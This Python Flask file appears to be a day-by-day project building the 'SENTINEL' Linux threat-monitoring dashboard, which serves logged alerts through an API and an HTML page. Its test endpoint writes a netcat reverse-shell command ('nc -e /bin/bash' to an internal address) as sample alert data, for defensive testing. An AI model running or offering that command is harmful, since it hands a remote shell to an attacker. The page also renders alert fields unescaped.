#!/usr/bin/env python3
"""
SENTINEL Dashboard - Days 10-11
Flask web interface for threat monitoring
"""

from flask import Flask, render_template, jsonify, request
import json
import os
import time
from datetime import datetime
from collections import deque
import threading
import glob

app = Flask(__name__)

# Alert storage
alert_cache = deque(maxlen=100)
stats = {
    'total_alerts': 0,
    'critical': 0,
    'high': 0,
    'medium': 0,
    'low': 0,
    'start_time': datetime.now().isoformat()
}

def load_alerts_from_logs():
    """Load alerts from JSON log files"""
    alerts = []
    log_dir = os.path.expanduser('~/sentinel/logs')
    
    # Get all alert files
    alert_files = glob.glob(os.path.join(log_dir, 'alerts_*.json'))
    
    for filepath in sorted(alert_files, reverse=True):
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    if line.strip():
                        alert = json.loads(line)
                        alerts.append(alert)
        except Exception as e:
            print(f"Error reading {filepath}: {e}")
    
    return alerts

def update_stats():
    """Update statistics from cached alerts"""
    stats['total_alerts'] = len(alert_cache)
    stats['critical'] = sum(1 for a in alert_cache if a.get('severity') == 'CRITICAL')
    stats['high'] = sum(1 for a in alert_cache if a.get('severity') == 'HIGH')
    stats['medium'] = sum(1 for a in alert_cache if a.get('severity') == 'MEDIUM')
    stats['low'] = sum(1 for a in alert_cache if a.get('severity') == 'LOW')

def alert_watcher():
    """Watch for new alerts in log files"""
    log_dir = os.path.expanduser('~/sentinel/logs')
    today = datetime.now().strftime('%Y%m%d')
    log_file = os.path.join(log_dir, f'alerts_{today}.json')
    
    last_size = 0
    if os.path.exists(log_file):
        last_size = os.path.getsize(log_file)
    
    while True:
        time.sleep(2)
        
        if os.path.exists(log_file):
            current_size = os.path.getsize(log_file)
            
            if current_size > last_size:
                # New data added
                with open(log_file, 'r') as f:
                    f.seek(last_size)
                    for line in f:
                        if line.strip():
                            try:
                                alert = json.loads(line)
                                alert_cache.append(alert)
                                update_stats()
                                print(f"[+] New alert: {alert.get('severity')} - {alert.get('type')}")
                            except:
                                pass
                
                last_size = current_size

@app.route('/')
def index():
    """Main dashboard page"""
    return render_template('dashboard.html')

@app.route('/api/alerts')
def get_alerts():
    """Get all alerts"""
    limit = request.args.get('limit', 50, type=int)
    alerts = list(alert_cache)[-limit:]
    return jsonify({'alerts': alerts, 'count': len(alerts)})

@app.route('/api/alerts/<int:alert_id>')
def get_alert(alert_id):
    """Get specific alert"""
    if alert_id < len(alert_cache):
        return jsonify(alert_cache[alert_id])
    return jsonify({'error': 'Alert not found'}), 404

@app.route('/api/stats')
def get_stats():
    """Get current statistics"""
    return jsonify(stats)

@app.route('/api/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'uptime': (datetime.now() - datetime.fromisoformat(stats['start_time'])).seconds,
        'alerts': stats['total_alerts']
    })

@app.route('/api/test')
def test_alert():
    """Generate a test alert"""
    test_data = {
        'type': 'process',
        'data': {
            'cmdline': 'nc -e /bin/bash 10.0.0.1 4444',
            'is_root': False,
            'pid': 9999,
            'comm': 'nc'
        },
        'severity': 'HIGH',
        'timestamp': datetime.now().isoformat()
    }
    
    # Log it
    log_dir = os.path.expanduser('~/sentinel/logs')
    today = datetime.now().strftime('%Y%m%d')
    log_file = os.path.join(log_dir, f'alerts_{today}.json')
    
    with open(log_file, 'a') as f:
        json.dump(test_data, f)
        f.write('\n')
    
    return jsonify({'status': 'Test alert generated'})

# Create HTML template
os.makedirs(os.path.expanduser('~/sentinel/src/templates'), exist_ok=True)

with open(os.path.expanduser('~/sentinel/src/templates/dashboard.html'), 'w') as f:
    f.write('''
<!DOCTYPE html>
<html>
<head>
    <title>SENTINEL Dashboard</title>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="30">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e12;
            color: #e0e0e0;
            padding: 20px;
        }
        .header {
            background: #1a1f24;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #00ff9d;
        }
        h1 { color: #00ff9d; font-size: 2em; }
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: #1a1f24;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
        }
        .stat-value { font-size: 2.5em; font-weight: bold; }
        .stat-label { color: #888; margin-top: 5px; }
        .critical { color: #ff4444; }
        .high { color: #ff8800; }
        .medium { color: #ffcc00; }
        .low { color: #00ff9d; }
        .alerts {
            background: #1a1f24;
            border-radius: 8px;
            padding: 20px;
        }
        .alert {
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 4px;
            background: #0d1117;
            border-left: 3px solid;
            cursor: pointer;
        }
        .alert:hover { background: #1a2028; }
        .alert.CRITICAL { border-color: #ff4444; }
        .alert.HIGH { border-color: #ff8800; }
        .alert.MEDIUM { border-color: #ffcc00; }
        .alert.LOW { border-color: #00ff9d; }
        .alert-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        .alert-type { font-weight: bold; }
        .alert-time { color: #888; font-size: 0.9em; }
        .alert-details {
            display: none;
            margin-top: 15px;
            padding: 15px;
            background: #0a0e12;
            border-radius: 4px;
        }
        .alert.expanded .alert-details { display: block; }
        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 3px;
            font-size: 0.8em;
            margin-right: 5px;
        }
        .badge.mitre { background: #1e3a5f; color: #7ab7ff; }
        .refresh { color: #00ff9d; float: right; }
        .no-alerts {
            text-align: center;
            padding: 40px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🛡️ SENTINEL Dashboard</h1>
        <p>Advanced Linux Threat Detection</p>
        <span class="refresh">Auto-refresh: 30s</span>
    </div>
    
    <div class="stats">
        <div class="stat-card">
            <div class="stat-value" id="total-alerts">0</div>
            <div class="stat-label">Total Alerts</div>
        </div>
        <div class="stat-card">
            <div class="stat-value critical" id="critical-alerts">0</div>
            <div class="stat-label">Critical</div>
        </div>
        <div class="stat-card">
            <div class="stat-value high" id="high-alerts">0</div>
            <div class="stat-label">High</div>
        </div>
        <div class="stat-card">
            <div class="stat-value" id="uptime">0</div>
            <div class="stat-label">Uptime (s)</div>
        </div>
    </div>
    
    <div class="alerts">
        <h2 style="margin-bottom: 20px;">📋 Recent Alerts</h2>
        <div id="alert-list">
            <div class="no-alerts">No alerts detected - system secure</div>
        </div>
    </div>
    
    <script>
        function toggleAlert(element) {
            element.classList.toggle('expanded');
        }
        
        function formatTime(isoString) {
            const date = new Date(isoString);
            return date.toLocaleTimeString();
        }
        
        function loadAlerts() {
            fetch('/api/alerts?limit=50')
                .then(r => r.json())
                .then(data => {
                    const container = document.getElementById('alert-list');
                    const alerts = data.alerts.reverse();
                    
                    if (alerts.length === 0) {
                        container.innerHTML = '<div class="no-alerts">✅ No alerts detected - system secure</div>';
                        return;
                    }
                    
                    container.innerHTML = alerts.map((alert, i) => {
                        const severity = alert.severity || 'LOW';
                        const llm = alert.llm_analysis || {};
                        const ml = alert.ml_analysis || {};
                        
                        return `
                            <div class="alert ${severity}" onclick="toggleAlert(this)">
                                <div class="alert-header">
                                    <span class="alert-type ${severity.toLowerCase()}">[${severity}] ${alert.type || 'UNKNOWN'}</span>
                                    <span class="alert-time">${alert.timestamp || 'N/A'}</span>
                                </div>
                                <div style="color: #aaa;">
                                    ${llm.detailed_description || llm.description || 'Threat detected'}
                                </div>
                                <div style="margin-top: 10px;">
                                    ${llm.mitre_techniques ? llm.mitre_techniques.map(t => `<span class="badge mitre">${t}</span>`).join('') : ''}
                                    ${ml.score ? `<span class="badge">Score: ${ml.score.toFixed(4)}</span>` : ''}
                                </div>
                                <div class="alert-details">
                                    <h4>🔍 Full Analysis</h4>
                                    <p><strong>Attack Stage:</strong> ${llm.attack_stage || 'N/A'}</p>
                                    <p><strong>Threat Likelihood:</strong> ${llm.threat_actor_likelihood || 'N/A'}</p>
                                    <p><strong>Key Indicators:</strong></p>
                                    <ul>
                                        ${(llm.key_indicators || []).map(i => `<li>${i}</li>`).join('')}
                                    </ul>
                                    <p><strong>Recommended Actions:</strong></p>
                                    <ul>
                                        ${(llm.recommended_actions || []).map(a => `<li>${a}</li>`).join('')}
                                    </ul>
                                    <h4>📊 Raw Event Data</h4>
                                    <pre style="background:#000; padding:10px; overflow-x:auto;">${JSON.stringify(alert.data || {}, null, 2)}</pre>
                                </div>
                            </div>
                        `;
                    }).join('');
                });
            
            fetch('/api/stats')
                .then(r => r.json())
                .then(stats => {
                    document.getElementById('total-alerts').textContent = stats.total_alerts || 0;
                    document.getElementById('critical-alerts').textContent = stats.critical || 0;
                    document.getElementById('high-alerts').textContent = stats.high || 0;
                });
            
            fetch('/api/health')
                .then(r => r.json())
                .then(health => {
                    document.getElementById('uptime').textContent = health.uptime || 0;
                });
        }
        
        // Load on page load
        loadAlerts();
        
        // Refresh every 5 seconds
        setInterval(loadAlerts, 5000);
    </script>
</body>
</html>
    ''')

if __name__ == '__main__':
    # Load existing alerts
    print("[*] Loading existing alerts...")
    existing = load_alerts_from_logs()
    for alert in existing[-50:]:
        alert_cache.append(alert)
    update_stats()
    print(f"[✓] Loaded {len(alert_cache)} alerts")
    
    # Start watcher thread
    watcher = threading.Thread(target=alert_watcher, daemon=True)
    watcher.start()
    print("[✓] Alert watcher started")
    
    # Start Flask
    print("\n" + "=" * 50)
    print("   SENTINEL Dashboard Ready!")
    print("=" * 50)
    print("\n   Open in browser: http://localhost:5000")
    print("\n   Press Ctrl+C to stop\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False)
